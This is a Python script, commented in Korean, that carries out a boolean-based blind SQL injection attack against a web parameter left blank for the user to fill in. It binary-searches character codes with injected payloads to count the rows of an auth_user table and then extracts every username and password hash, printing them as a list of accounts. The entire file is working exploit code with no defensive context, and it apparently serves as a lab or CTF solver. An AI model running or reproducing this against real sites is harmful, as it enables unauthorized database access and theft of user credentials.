import requests

URL = ""
PARAM = ""
TRUE_INDICATOR = ""

def send_payload(payload):
    r = requests.get(URL, params={PARAM: payload}, verify=False)
    return r.text

def is_true(payload):
    return TRUE_INDICATOR in send_payload(payload)

def get_string(query, max_len=200):
    """주어진 SQL query 결과 문자열을 Blind SQLi로 추출"""
    result = ""
    for i in range(1, max_len+1):
        low, high = 32, 126
        char = None
        while low <= high:
            mid = (low + high) // 2
            payload = f"x' OR ASCII(SUBSTRING(({query}),{i},1))>{mid}-- -"
            if is_true(payload):
                low = mid + 1
            else:
                payload = f"x' OR ASCII(SUBSTRING(({query}),{i},1))={mid}-- -"
                if is_true(payload):
                    char = chr(mid)
                    break
                high = mid - 1
        if char:
            result += char
        else:
            break
    return result

def get_user_count():
    """auth_user 테이블 사용자 수 확인"""
    for i in range(1, 101):  # 최대 100명까지 체크
        payload = f"x' OR (SELECT COUNT(*) FROM auth_user)={i}-- -"
        if is_true(payload):
            return i
    return None

def get_user(row=0):
    """특정 row의 username, password 추출"""
    uname_q = f"SELECT username FROM auth_user LIMIT {row},1"
    pwd_q   = f"SELECT password FROM auth_user LIMIT {row},1"

    username = get_string(uname_q, max_len=50)
    password = get_string(pwd_q, max_len=200)
    return username, password

if __name__ == "__main__":
    print("[*] 사용자 수 확인 중 ...")
    user_count = get_user_count()
    print(f"[+] 총 사용자 수: {user_count}\n")

    all_users = []
    for i in range(user_count):
        print(f"[*] {i+1}/{user_count}번째 사용자 추출 중 ...")
        uname, pwd = get_user(i)
        all_users.append((uname, pwd))
        print(f"[+] {uname} : {pwd}\n")

    print("\n=== 최종 사용자 계정 목록 ===")
    for idx, (u, p) in enumerate(all_users, start=1):
        print(f"{idx}. {u} : {p}")
